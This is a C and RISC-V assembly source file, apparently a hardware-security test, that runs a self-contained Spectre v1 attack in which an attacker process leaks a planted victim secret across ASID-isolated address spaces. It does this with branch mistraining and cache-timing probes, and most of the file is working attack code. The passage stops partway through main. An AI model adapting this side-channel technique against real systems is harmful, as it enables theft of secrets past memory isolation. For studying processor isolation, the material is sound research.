#include <am.h>
#include <klib.h>
#include <stdint.h>
#include <xsextra.h>

#include "encoding.h"
#include "cache-utils.h"

#ifndef TRAIN_TIMES
#define TRAIN_TIMES 10
#endif

#ifndef ROUNDS
#define ROUNDS 1
#endif

#ifndef ATTACK_SAME_ROUNDS
#define ATTACK_SAME_ROUNDS 2
#endif

#ifndef EARLY_STOP
#define EARLY_STOP 1
#endif

#ifndef EARLY_STOP_MIN_SCORE
#define EARLY_STOP_MIN_SCORE 3
#endif

#ifndef EARLY_STOP_GAP
#define EARLY_STOP_GAP 2
#endif

#ifndef SECRET_SZ
#define SECRET_SZ 6
#endif

#ifndef SECRET_OFFSET
#define SECRET_OFFSET 0
#endif

#ifndef CACHE_HIT_THRESHOLD
#define CACHE_HIT_THRESHOLD 70
#endif

#ifndef USE_FIXED_CACHE_HIT_THRESHOLD
#define USE_FIXED_CACHE_HIT_THRESHOLD 0
#endif

#ifndef PROBE_CANDIDATES
#define PROBE_CANDIDATES 62
#endif

#ifndef FULL_BYTE_PROBE
#define FULL_BYTE_PROBE 0
#endif

#ifndef FLUSH_LINES
#define FLUSH_LINES PROBE_ENTRIES
#endif

#ifndef FLUSH_CANDIDATE_LINES_ONLY
#define FLUSH_CANDIDATE_LINES_ONLY 0
#endif

#ifndef CONTROL_ONLY
#define CONTROL_ONLY 0
#endif

#ifndef USE_BASELINE_SUBTRACT
#define USE_BASELINE_SUBTRACT 0
#endif

#ifndef FILTER_KNOWN_NOISE
#define FILTER_KNOWN_NOISE 0
#endif

#ifndef ATTACKER_ASID
#define ATTACKER_ASID 17u
#endif

#ifndef VICTIM_ASID
#define VICTIM_ASID 23u
#endif

#define ASID16(x) ((x) & 0xffffu)

#if ASID16(ATTACKER_ASID) == 0 || ASID16(VICTIM_ASID) == 0
#error "ATTACKER_ASID and VICTIM_ASID must be non-zero after 16-bit normalization"
#endif

#if ASID16(ATTACKER_ASID) == ASID16(VICTIM_ASID)
#error "ATTACKER_ASID and VICTIM_ASID must differ after 16-bit normalization"
#endif

#ifndef FENCE_ON_ASID_SWITCH
#define FENCE_ON_ASID_SWITCH 0
#endif

#define PROBE_ENTRIES 256u
#define PROBE_STRIDE L1_BLOCK_SZ_BYTES
_Static_assert(PROBE_STRIDE == 64, "victim_process_gadget assumes 64-byte probe stride");

#define SVC_VICTIM 1u
#define SVC_FLUSH_PROBE 2u
#define SVC_EXIT 3u
#define SVC_VICTIM_DONE 4u

#define MCAUSE_USER_ECALL 8u
#define MCAUSE_LOAD_ACCESS_FAULT 5u
#define MCAUSE_LOAD_PAGE_FAULT 13u
#define MSTATUS_MPP_MASK (3ull << 11)

#define PAGE_SHIFT 12u
#define PAGE_SIZE (1ull << PAGE_SHIFT)
#define PTES_PER_PT 512u
#define SATP_MODE_SV39 (8ull << 60)
#define SATP_ASID_SHIFT 44u
#define SATP_ASID_MASK (0xffffull << SATP_ASID_SHIFT)
#define VPTE_V (1ull << 0)
#define VPTE_R (1ull << 1)
#define VPTE_W (1ull << 2)
#define VPTE_X (1ull << 3)
#define VPTE_U (1ull << 4)
#define VPTE_A (1ull << 6)
#define VPTE_D (1ull << 7)

#define PUBLIC_ARRAY1_SZ 16u
#define U_TEXT __attribute__((section(".u_text"), noinline, aligned(16)))
#define A_DATA __attribute__((section(".a_data"), aligned(4096)))
#define V_DATA __attribute__((section(".v_data"), aligned(4096)))
#define SHARED_DATA __attribute__((section(".shared_data"), aligned(4096)))

asm(
    ".section .u_text,\"ax\",@progbits\n"
    ".balign 4096\n"
    ".globl __u_text_start\n"
    "__u_text_start:\n"
    ".previous\n");

asm(
    ".section .a_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __a_data_start\n"
    "__a_data_start:\n"
    ".previous\n");

static uint8_t A_DATA attacker_stack[16 * 1024];
static uint8_t A_DATA leaked_idx[SECRET_SZ][2];
static uint64_t A_DATA leaked_score[SECRET_SZ][2];
static uint64_t A_DATA rounds_used[SECRET_SZ];
static uint64_t A_DATA active_threshold;
static volatile uint64_t A_DATA direct_victim_fault_expected;
static volatile uint64_t A_DATA direct_victim_fault_seen;
static volatile uint64_t A_DATA direct_victim_read_completed;
static volatile uint64_t A_DATA direct_victim_read_value;

asm(
    ".section .a_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __a_data_end\n"
    "__a_data_end:\n"
    ".previous\n");

asm(
    ".section .shared_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __shared_data_start\n"
    "__shared_data_start:\n"
    ".previous\n");

static uint8_t SHARED_DATA shared_probe[PROBE_ENTRIES * PROBE_STRIDE];
static volatile uint8_t SHARED_DATA m_dummy;

asm(
    ".section .shared_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __shared_data_end\n"
    "__shared_data_end:\n"
    ".previous\n");

asm(
    ".section .v_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __v_data_start\n"
    "__v_data_start:\n"
    ".previous\n");

struct victim_region {
  uint8_t array1[16];
  uint8_t pad[64];
  uint8_t secret[16];
} __attribute__((packed, aligned(64)));

static struct victim_region V_DATA victim_region = {
  .array1 = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16},
  .secret = "S3CreT",
};
static volatile uint64_t V_DATA victim_array1_sz = PUBLIC_ARRAY1_SZ;
static volatile uint64_t V_DATA victim_arg_idx;
static volatile uintptr_t V_DATA victim_arg_probe;
static uint8_t V_DATA victim_stack[16 * 1024];

asm(
    ".section .v_data,\"aw\",@progbits\n"
    ".balign 4096\n"
    ".globl __v_data_end\n"
    "__v_data_end:\n"
    ".previous\n");

static volatile uint64_t trap_count;
static volatile uint64_t victim_call_count;
static volatile uint64_t victim_done_count;
static volatile uint64_t flush_call_count;
static volatile uint64_t exit_call_count;
static volatile uint64_t bad_trap_count;
static volatile uint64_t last_mcause;
static volatile uint64_t last_mepc;
static volatile int attack_done;
static volatile int attack_status;
static volatile int victim_trap_return_to_machine;
static uintptr_t saved_main_m_sp;
static uintptr_t saved_victim_m_sp __attribute__((used));
static uint8_t m_stack[16 * 1024] __attribute__((aligned(16)));
static volatile uintptr_t observed_attacker_satp;
static volatile uintptr_t observed_victim_satp;
static volatile uintptr_t attacker_satp_for_trap;
static volatile uintptr_t current_trap_frame_sp;
static volatile uintptr_t saved_attacker_trap_sp;
static volatile uintptr_t saved_attacker_mscratch;
static volatile uintptr_t resume_attacker_epc;

struct page_space {
  uint64_t root[PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
  uint64_t l1[8][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
  uint64_t l0[64][PTES_PER_PT] __attribute__((aligned(PAGE_SIZE)));
  uint64_t l1_used;
  uint64_t l0_used;
  uint64_t asid;
  uintptr_t satp;
} __attribute__((aligned(PAGE_SIZE)));

static struct page_space attacker_space;
static struct page_space victim_space;

extern char __u_text_start[];
extern char __u_text_end[];
extern char __a_data_start[];
extern char __a_data_end[];
extern char __shared_data_start[];
extern char __shared_data_end[];
extern char __v_data_start[];
extern char __v_data_end[];

static inline uintptr_t page_down(uintptr_t addr)
{
  return addr & ~(uintptr_t)(PAGE_SIZE - 1);
}

static inline uintptr_t page_up(uintptr_t addr)
{
  return (addr + PAGE_SIZE - 1) & ~(uintptr_t)(PAGE_SIZE - 1);
}

static void zero_page(void *page)
{
  uint64_t *p = (uint64_t *)page;
  for (uint64_t i = 0; i < PTES_PER_PT; ++i)
    p[i] = 0;
}

static int alloc_l1(struct page_space *space)
{
  if (space->l1_used >= 8)
    return -1;
  zero_page(space->l1[space->l1_used]);
  return (int)space->l1_used++;
}

static int alloc_l0(struct page_space *space)
{
  if (space->l0_used >= 64)
    return -1;
  zero_page(space->l0[space->l0_used]);
  return (int)space->l0_used++;
}

static uint64_t *walk_page(struct page_space *space, uintptr_t va, int alloc)
{
  uintptr_t vpn2 = (va >> 30) & 0x1ffu;
  uintptr_t vpn1 = (va >> 21) & 0x1ffu;
  uintptr_t vpn0 = (va >> 12) & 0x1ffu;
  uint64_t *l1;
  uint64_t *l0;
  int idx;

  if ((space->root[vpn2] & VPTE_V) == 0) {
    if (!alloc)
      return NULL;
    idx = alloc_l1(space);
    if (idx < 0)
      return NULL;
    space->root[vpn2] =
        (((uintptr_t)space->l1[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l1 = (uint64_t *)(((space->root[vpn2] >> 10) << PAGE_SHIFT));

  if ((l1[vpn1] & VPTE_V) == 0) {
    if (!alloc)
      return NULL;
    idx = alloc_l0(space);
    if (idx < 0)
      return NULL;
    l1[vpn1] = (((uintptr_t)space->l0[idx] >> PAGE_SHIFT) << 10) | VPTE_V;
  }
  l0 = (uint64_t *)(((l1[vpn1] >> 10) << PAGE_SHIFT));
  return &l0[vpn0];
}

static int map_identity_page(struct page_space *space, uintptr_t va, uint64_t perm)
{
  uint64_t *pte = walk_page(space, va, 1);
  if (pte == NULL)
    return -1;
  *pte = ((va >> PAGE_SHIFT) << 10) | VPTE_V | VPTE_A | perm |
         ((perm & VPTE_W) ? VPTE_D : 0);
  return 0;
}

static int map_identity_range(struct page_space *space, uintptr_t start,
                              uintptr_t end, uint64_t perm)
{
  uintptr_t cur = page_down(start);
  uintptr_t limit = page_up(end);
  for (; cur < limit; cur += PAGE_SIZE) {
    if (map_identity_page(space, cur, perm) != 0)
      return -1;
  }
  return 0;
}

static void init_page_space(struct page_space *space, uint64_t asid)
{
  zero_page(space->root);
  space->l1_used = 0;
  space->l0_used = 0;
  space->asid = ASID16(asid);
  space->satp = SATP_MODE_SV39 |
                (space->asid << SATP_ASID_SHIFT) |
                (((uintptr_t)space->root) >> PAGE_SHIFT);
}

static inline uintptr_t switch_satp(uintptr_t satp, int flush)
{
  uintptr_t observed;

  asm volatile("csrw satp, %0" :: "r"(satp) : "memory");
  if (flush)
    asm volatile("sfence.vma zero, zero" ::: "memory");
  asm volatile("fence.i\ncsrr %0, satp" : "=r"(observed) :: "memory");
  return observed;
}

static void install_asid_page_tables(void)
{
  init_page_space(&attacker_space, ATTACKER_ASID);
  init_page_space(&victim_space, VICTIM_ASID);
  attacker_satp_for_trap = attacker_space.satp;

  if (map_identity_range(&attacker_space, (uintptr_t)__u_text_start,
                         (uintptr_t)__u_text_end, VPTE_R | VPTE_X | VPTE_U) != 0)
    panic("map attacker u_text failed");
  if (map_identity_range(&victim_space, (uintptr_t)__u_text_start,
                         (uintptr_t)__u_text_end, VPTE_R | VPTE_X | VPTE_U) != 0)
    panic("map victim u_text failed");
  if (map_identity_range(&attacker_space, (uintptr_t)__a_data_start,
                         (uintptr_t)__a_data_end, VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map attacker data failed");
  if (map_identity_range(&attacker_space, (uintptr_t)__shared_data_start,
                         (uintptr_t)__shared_data_end, VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map attacker shared data failed");
  if (map_identity_range(&victim_space, (uintptr_t)__shared_data_start,
                         (uintptr_t)__shared_data_end, VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map victim shared data failed");
  if (map_identity_range(&victim_space, (uintptr_t)__v_data_start,
                         (uintptr_t)__v_data_end, VPTE_R | VPTE_W | VPTE_U) != 0)
    panic("map victim data failed");
}

static U_TEXT uint64_t candidate_value(uint64_t idx)
{
  if (idx < 10)
    return '0' + idx;
  if (idx < 36)
    return 'A' + (idx - 10);
  return 'a' + (idx - 36);
}

static U_TEXT uint64_t candidate_probe_value(uint64_t idx)
{
#if FULL_BYTE_PROBE
  return ((idx * 167u) + 13u) & 255u;
#else
  return candidate_value((idx * 17u + 13u) % 62u);
#endif
}

static U_TEXT int is_training_value(uint64_t value)
{
  for (uint64_t i = 1; i <= PUBLIC_ARRAY1_SZ; ++i) {
    if (value == i)
      return 1;
  }
  return 0;
}

static U_TEXT int is_known_noise_value(uint64_t value)
{
#if FILTER_KNOWN_NOISE
  return value == 'q' || value == 'w' ||
         value == '4' || value == '5' ||
         value == '6' || value == '7';
#else
  (void)value;
  return 0;
#endif
}

static U_TEXT void top_two_idx(uint64_t *in, uint64_t count,
                               uint8_t out_idx[2], uint64_t out_score[2])
{
  out_idx[0] = 0;
  out_idx[1] = 0;
  out_score[0] = 0;
  out_score[1] = 0;

  for (uint64_t i = 0; i < count; ++i) {
    if (in[i] > out_score[0]) {
      out_score[1] = out_score[0];
      out_idx[1] = out_idx[0];
      out_score[0] = in[i];
      out_idx[0] = i;
    } else if (in[i] > out_score[1]) {
      out_score[1] = in[i];
      out_idx[1] = i;
    }
  }
}

static U_TEXT int enough_confidence(uint64_t *results)
{
  uint8_t idx[2];
  uint64_t score[2];

  top_two_idx(results, PROBE_ENTRIES, idx, score);
  (void)idx;
  return score[0] >= EARLY_STOP_MIN_SCORE &&
         score[0] >= score[1] + EARLY_STOP_GAP;
}

static U_TEXT uint64_t u_probe_time(volatile uint8_t *addr)
{
  uint64_t start;
  uint64_t end;
  uint8_t dummy;

  asm volatile(
      "fence rw, rw\n"
      "rdcycle %[start]\n"
      "lbu %[dummy], 0(%[addr])\n"
      "fence rw, rw\n"
      "rdcycle %[end]\n"
      : [start] "=&r"(start), [end] "=&r"(end), [dummy] "=&r"(dummy)
      : [addr] "r"(addr)
      : "memory");
  (void)dummy;
  return end - start;
}

static U_TEXT void probe_direct_victim_access(void)
{
  uint64_t value = 0;

  direct_victim_fault_seen = 0;
  direct_victim_read_completed = 0;
  direct_victim_read_value = 0;
  direct_victim_fault_expected = 1;
  asm volatile("lbu %0, 0(%1)" : "=&r"(value) : "r"(victim_region.secret) : "memory");
  direct_victim_fault_expected = 0;
  if (!direct_victim_fault_seen) {
    direct_victim_read_value = value;
    direct_victim_read_completed = 1;
  }
}

static void flush_probe_service(uint8_t *probe)
{
#if USE_EVICTION_FLUSH
#if FLUSH_CANDIDATE_LINES_ONLY
  for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
    uint64_t mixed_i = candidate_probe_value(i);
    flushCache((uint64_t)&probe[mixed_i * PROBE_STRIDE], L1_BLOCK_SZ_BYTES);
  }
#else
  flushCache((uint64_t)probe, FLUSH_LINES * PROBE_STRIDE);
#endif
  flushCache((uint64_t)&victim_array1_sz, sizeof(victim_array1_sz));
#else
#if FLUSH_CANDIDATE_LINES_ONLY
  for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
    uint64_t mixed_i = candidate_probe_value(i);
    xs_flush_cache_line(&probe[mixed_i * PROBE_STRIDE]);
  }
#else
  for (uint64_t i = 0; i < FLUSH_LINES; ++i)
    xs_flush_cache_line(&probe[i * PROBE_STRIDE]);
#endif

  xs_flush_cache_line((void *)&victim_array1_sz);
#endif
  xs_fence();
}

static U_TEXT __attribute__((noinline)) void victim_process_gadget(uint64_t idx,
                                                                   volatile uint8_t *probe)
{
  uintptr_t base = (uintptr_t)victim_region.array1;
  uintptr_t sz_ptr = (uintptr_t)&victim_array1_sz;
  uintptr_t probe_base = (uintptr_t)probe;

  asm volatile(
      "ld    t0, 0(%[sz_ptr])\n"
      "slli  t0, t0, 4\n"
      "li    t6, 2\n"
      "divu  t0, t0, t6\n"
      "divu  t0, t0, t6\n"
      "divu  t0, t0, t6\n"
      "divu  t0, t0, t6\n"
      "bltu  %[idx], t0, 1f\n"
      "j     2f\n"
      "1:\n"
      "add   t1, %[base], %[idx]\n"
      "lbu   t2, 0(t1)\n"
      "slli  t2, t2, 6\n"
      "add   t3, %[probe_base], t2\n"
      "lbu   t4, 0(t3)\n"
      "la    t5, m_dummy\n"
      "sb    t4, 0(t5)\n"
      "2:\n"
      :
      : [idx] "r"(idx),
        [base] "r"(base),
        [sz_ptr] "r"(sz_ptr),
        [probe_base] "r"(probe_base)
      : "t0", "t1", "t2", "t3", "t4", "t5", "t6", "memory");
}

static U_TEXT __attribute__((noreturn, unused)) void victim_process_entry(void)
{
  victim_process_gadget(victim_arg_idx, (volatile uint8_t *)victim_arg_probe);

  register uint64_t a7 asm("a7") = SVC_VICTIM_DONE;
  asm volatile("ecall" :: "r"(a7) : "memory");
  for (;;)
    asm volatile("wfi");
}

static void run_victim_process(uint64_t idx, volatile uint8_t *probe)
{
  uintptr_t victim_sp = (uintptr_t)victim_stack + sizeof(victim_stack) - 16;
  uintptr_t machine_sp = (uintptr_t)m_stack + (sizeof(m_stack) / 2) - 16;
  uintptr_t saved_mscratch;
  uintptr_t mstatus;

  victim_arg_idx = idx;
  victim_arg_probe = (uintptr_t)probe;
  victim_trap_return_to_machine = 0;

  asm volatile("csrr %0, mscratch" : "=r"(saved_mscratch));
  observed_victim_satp = switch_satp(victim_space.satp, FENCE_ON_ASID_SWITCH);
  asm volatile("csrr %0, mstatus" : "=r"(mstatus));
  mstatus = (mstatus & ~MSTATUS_MPP_MASK) | (0ull << 11);

  asm volatile(
      "la t0, saved_victim_m_sp\n"
      "sd sp, 0(t0)\n"
      "csrw mscratch, %[machine_sp]\n"
      "mv sp, %[victim_sp]\n"
      "csrw mstatus, %[mstatus]\n"
      "csrw mepc, %[entry]\n"
      "mret\n"
      ".globl victim_machine_return\n"
      "victim_machine_return:\n"
      "la t0, saved_victim_m_sp\n"
      "ld sp, 0(t0)\n"
      :
      : [machine_sp] "r"(machine_sp),
        [victim_sp] "r"(victim_sp),
        [mstatus] "r"(mstatus),
        [entry] "r"((uintptr_t)victim_process_entry)
      : "t0", "memory");

  asm volatile("csrw mscratch, %0" :: "r"(saved_mscratch) : "memory");
  observed_attacker_satp = switch_satp(attacker_space.satp, FENCE_ON_ASID_SWITCH);
}

void m_trap_dispatch(uint64_t cause, uint64_t epc,
                     uint64_t a0, uint64_t a1, uint64_t a7)
{
  trap_count++;
  last_mcause = cause;
  last_mepc = epc;

  if ((cause == MCAUSE_LOAD_ACCESS_FAULT || cause == MCAUSE_LOAD_PAGE_FAULT) &&
      direct_victim_fault_expected != 0) {
    direct_victim_fault_seen = 1;
    direct_victim_fault_expected = 0;
    return;
  }

  if (cause != MCAUSE_USER_ECALL) {
    bad_trap_count++;
    attack_status = 2;
    attack_done = 1;
    return;
  }

  if (a7 == SVC_VICTIM) {
    victim_call_count++;
    resume_attacker_epc = epc + 4;
    saved_attacker_trap_sp = current_trap_frame_sp;
    asm volatile("csrr %0, mscratch" : "=r"(saved_attacker_mscratch));
    run_victim_process(a0, (volatile uint8_t *)a1);
  } else if (a7 == SVC_VICTIM_DONE) {
    victim_done_count++;
    victim_trap_return_to_machine = 1;
  } else if (a7 == SVC_FLUSH_PROBE) {
    flush_call_count++;
    flush_probe_service((uint8_t *)a0);
  } else if (a7 == SVC_EXIT) {
    exit_call_count++;
    attack_status = (int)a0;
    attack_done = 1;
  } else {
    bad_trap_count++;
    attack_status = 3;
    attack_done = 1;
  }
}

void m_trap_entry(void);
asm(
    ".section .text\n"
    ".align 2\n"
    ".globl m_trap_entry\n"
    "m_trap_entry:\n"
    "  csrrw sp, mscratch, sp\n"
    "  addi sp, sp, -160\n"
    "  sd ra, 0(sp)\n"
    "  sd t0, 8(sp)\n"
    "  sd t1, 16(sp)\n"
    "  sd t2, 24(sp)\n"
    "  la t0, current_trap_frame_sp\n"
    "  sd sp, 0(t0)\n"
    "  sd a0, 32(sp)\n"
    "  sd a1, 40(sp)\n"
    "  sd a2, 48(sp)\n"
    "  sd a3, 56(sp)\n"
    "  sd a4, 64(sp)\n"
    "  sd a5, 72(sp)\n"
    "  sd a6, 80(sp)\n"
    "  sd a7, 88(sp)\n"
    "  csrr a0, mcause\n"
    "  csrr a1, mepc\n"
    "  ld a2, 32(sp)\n"
    "  ld a3, 40(sp)\n"
    "  ld a4, 88(sp)\n"
    "  call m_trap_dispatch\n"
    "  la t0, victim_trap_return_to_machine\n"
    "  lw t1, 0(t0)\n"
    "  bnez t1, 2f\n"
    "  la t0, attack_done\n"
    "  lw t1, 0(t0)\n"
    "  bnez t1, 3f\n"
    "  csrr t0, mepc\n"
    "  addi t0, t0, 4\n"
    "  csrw mepc, t0\n"
    "1:\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 160\n"
    "  csrrw sp, mscratch, sp\n"
    "  mret\n"
    "2:\n"
    "  sw zero, 0(t0)\n"
    "  la t0, saved_attacker_mscratch\n"
    "  ld t1, 0(t0)\n"
    "  csrw mscratch, t1\n"
    "  la t0, attacker_satp_for_trap\n"
    "  ld t1, 0(t0)\n"
    "  csrw satp, t1\n"
    "  fence.i\n"
    "  csrr t1, satp\n"
    "  la t0, observed_attacker_satp\n"
    "  sd t1, 0(t0)\n"
    "  la t0, resume_attacker_epc\n"
    "  ld t1, 0(t0)\n"
    "  csrw mepc, t1\n"
    "  li t0, 0x21800\n"
    "  csrc mstatus, t0\n"
    "  la t0, saved_attacker_trap_sp\n"
    "  ld sp, 0(t0)\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 160\n"
    "  csrrw sp, mscratch, sp\n"
    "  mret\n"
    "3:\n"
    "  la t0, machine_low_return\n"
    "  csrw mepc, t0\n"
    "  li t0, 0x21800\n"
    "  csrc mstatus, t0\n"
    "  li t0, 0x1800\n"
    "  csrs mstatus, t0\n"
    "  ld ra, 0(sp)\n"
    "  ld t0, 8(sp)\n"
    "  ld t1, 16(sp)\n"
    "  ld t2, 24(sp)\n"
    "  ld a0, 32(sp)\n"
    "  ld a1, 40(sp)\n"
    "  ld a2, 48(sp)\n"
    "  ld a3, 56(sp)\n"
    "  ld a4, 64(sp)\n"
    "  ld a5, 72(sp)\n"
    "  ld a6, 80(sp)\n"
    "  ld a7, 88(sp)\n"
    "  addi sp, sp, 160\n"
    "  la t0, machine_low_return\n"
    "  jr t0\n");

static U_TEXT void svc_victim(uint64_t idx, volatile uint8_t *probe)
{
  register uint64_t a0 asm("a0") = idx;
  register uint64_t a1 asm("a1") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_VICTIM;
  asm volatile("ecall" : "+r"(a0) : "r"(a1), "r"(a7) : "memory");
}

static U_TEXT void svc_flush_probe(volatile uint8_t *probe)
{
  register uint64_t a0 asm("a0") = (uint64_t)probe;
  register uint64_t a7 asm("a7") = SVC_FLUSH_PROBE;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
}

static U_TEXT void svc_exit(uint64_t status)
{
  register uint64_t a0 asm("a0") = status;
  register uint64_t a7 asm("a7") = SVC_EXIT;
  asm volatile("ecall" : "+r"(a0) : "r"(a7) : "memory");
  __builtin_unreachable();
}

static U_TEXT int attacker_run(void)
{
  uint64_t malicious_base =
      (uintptr_t)victim_region.secret - (uintptr_t)victim_region.array1;

#if CONTROL_ONLY
  probe_direct_victim_access();
  svc_flush_probe(shared_probe);
  svc_victim(0, shared_probe);
  return 0;
#endif

  probe_direct_victim_access();

  for (uint64_t len = 0; len < SECRET_SZ; ++len) {
    uint64_t results[PROBE_ENTRIES];
#if USE_BASELINE_SUBTRACT
    uint64_t baseline[PROBE_ENTRIES];
#endif
    for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
      results[i] = 0;
#if USE_BASELINE_SUBTRACT
    for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
      baseline[i] = 0;
#endif

    for (uint64_t atk_round = 0; atk_round < ATTACK_SAME_ROUNDS; ++atk_round) {
      svc_flush_probe(shared_probe);

#if USE_BASELINE_SUBTRACT
      for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
        uint64_t mixed_i = candidate_probe_value(i);
        if (is_training_value(mixed_i) || is_known_noise_value(mixed_i))
          continue;
        uint64_t elapsed = u_probe_time(&shared_probe[mixed_i * PROBE_STRIDE]);
        if (elapsed < active_threshold)
          baseline[mixed_i]++;
      }

      svc_flush_probe(shared_probe);
#endif

      for (int64_t j = ((TRAIN_TIMES + 1) * ROUNDS) - 1; j >= 0; --j) {
        uint64_t rand_idx = atk_round % PUBLIC_ARRAY1_SZ;
        uint64_t attack_idx = malicious_base + SECRET_OFFSET + len;
        uint64_t pass_idx = ((j % (TRAIN_TIMES + 1)) - 1) & ~0xffffUL;
        pass_idx = pass_idx | (pass_idx >> 16);
        pass_idx = rand_idx ^ (pass_idx & (attack_idx ^ rand_idx));

        for (uint64_t k = 0; k < 30; ++k)
          asm volatile("" ::: "memory");

        svc_victim(pass_idx, shared_probe);
      }

      for (uint64_t i = 0; i < PROBE_CANDIDATES; ++i) {
        uint64_t mixed_i = candidate_probe_value(i);
        if (is_training_value(mixed_i) || is_known_noise_value(mixed_i))
          continue;
        uint64_t elapsed = u_probe_time(&shared_probe[mixed_i * PROBE_STRIDE]);
        if (elapsed < active_threshold)
          results[mixed_i]++;
      }

      rounds_used[len] = atk_round + 1;
#if EARLY_STOP
      if (enough_confidence(results))
        break;
#endif
    }

#if USE_BASELINE_SUBTRACT
    for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
      results[i] = (results[i] > baseline[i]) ? (results[i] - baseline[i]) : 0;
#endif
    top_two_idx(results, PROBE_ENTRIES, leaked_idx[len], leaked_score[len]);
  }

  return 0;
}

static U_TEXT __attribute__((noreturn, unused)) void attacker_entry(void)
{
  svc_exit((uint64_t)attacker_run());
  for (;;)
    asm volatile("wfi");
}

asm(
    ".section .u_text,\"ax\",@progbits\n"
    ".balign 4096\n"
    ".globl __u_text_end\n"
    "__u_text_end:\n"
    ".previous\n");

static void enter_attacker_process(void)
{
  uintptr_t user_sp = (uintptr_t)attacker_stack + sizeof(attacker_stack) - 16;
  uintptr_t machine_sp = (uintptr_t)m_stack + sizeof(m_stack) - 16;
  uintptr_t mstatus;

  init_pmp();
  asm volatile("csrw mtvec, %0" :: "r"((uintptr_t)m_trap_entry) : "memory");
  asm volatile("csrw medeleg, zero\ncsrw mideleg, zero" ::: "memory");
  asm volatile("li t0, -1\ncsrw mcounteren, t0\ncsrw scounteren, t0" ::: "t0", "memory");
  install_asid_page_tables();
  observed_attacker_satp = switch_satp(attacker_space.satp, 1);
  asm volatile("mv %0, sp" : "=r"(saved_main_m_sp));

  asm volatile("csrr %0, mstatus" : "=r"(mstatus));
  mstatus = (mstatus & ~MSTATUS_MPP_MASK) | (0ull << 11);

  asm volatile(
      "csrw mscratch, %[machine_sp]\n"
      "mv sp, %[user_sp]\n"
      "csrw mstatus, %[mstatus]\n"
      "csrw mepc, %[entry]\n"
      "mret\n"
      ".globl machine_low_return\n"
      "machine_low_return:\n"
      "la t0, saved_main_m_sp\n"
      "ld sp, 0(t0)\n"
      :
      : [machine_sp] "r"(machine_sp),
        [user_sp] "r"(user_sp),
        [mstatus] "r"(mstatus),
        [entry] "r"((uintptr_t)attacker_entry)
      : "t0", "memory");
}

int main(void)
{
  for (uint64_t i = 0; i < PROBE_ENTRIES; ++i)
    shared_probe[i * PROBE_STRIDE] = 1;

  uint64_t measured_threshold = xs_calibrate_threshold(shared_probe, PROBE_STRIDE);
  active_threshold = measured_threshold;
#if USE_FIXED_CACHE_HIT_THRESHOLD
  active_threshold = CACHE_HIT_THRESHOLD;
#else
  if (active_threshold == 0)
    active_threshold = CACHE_HIT_THRESHOLD;
#endif

  printf("[v1-asid-priv] model=sv39-asid-process-isolation attacker=U victim=U service=machine-scheduler attacker_asid=%lu victim_asid=%lu normalized_attacker_asid=%lu normalized_victim_asid=%lu fence_on_switch=%d baseline_subtract=%d filter_known_noise=%d secret_sz=%d candidates=%d flush_lines=%d flush_candidates_only=%d control_only=%d\n",
         (uint64_t)ATTACKER_ASID, (uint64_t)VICTIM_ASID,
         (uint64_t)ASID16(ATTACKER_ASID), (uint64_t)ASID16(VICTIM_ASID),
         FENCE_ON_ASID_SWITCH, USE_BASELINE_SUBTRACT, FILTER_KNOWN_NOISE,
         SECRET_SZ, PROBE_CANDIDATES, FLUSH_LINES, FLUSH_CANDIDATE_LINES_ONLY,
         CONTROL_ONLY);
  printf("[v1-asid-priv] secret_offset=%d\n", SECRET_OFFSET);
  printf("[v1-asid-priv] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
         CACHE_HIT_THRESHOLD, measured_threshold, active_threshold,
         USE_FIXED_CACHE_HIT_THRESHOLD);
  printf("[v1-asid-priv] isolation attacker_direct_victim_secret=expect-fault shared_probe=mapped-both victim_data=mapped-victim-only\n");
  printf("[v1-asid-priv] victim_array1=%p victim_secret=%p malicious_base=%lu probe=%p\n",
         victim_region.array1, victim_region.secret,
         (uint64_t)((uintptr_t)victim_region.secret - (uintptr_t)victim_region.array1),
         shared_probe);

  enter_attacker_process();

  printf("[v1-asid-priv] isolation U-direct-victim-read fault_seen=%lu completed=%lu value=0x%02lx u_text=[%p,%p) a_data=[%p,%p) shared=[%p,%p) v_data=[%p,%p)\n",
         direct_victim_fault_seen, direct_victim_read_completed,
         direct_victim_read_value & 0xfful,
         __u_text_start, __u_text_end,
         __a_data_start, __a_data_end,
         __shared_data_start, __shared_data_end,
         __v_data_start, __v_data_end);
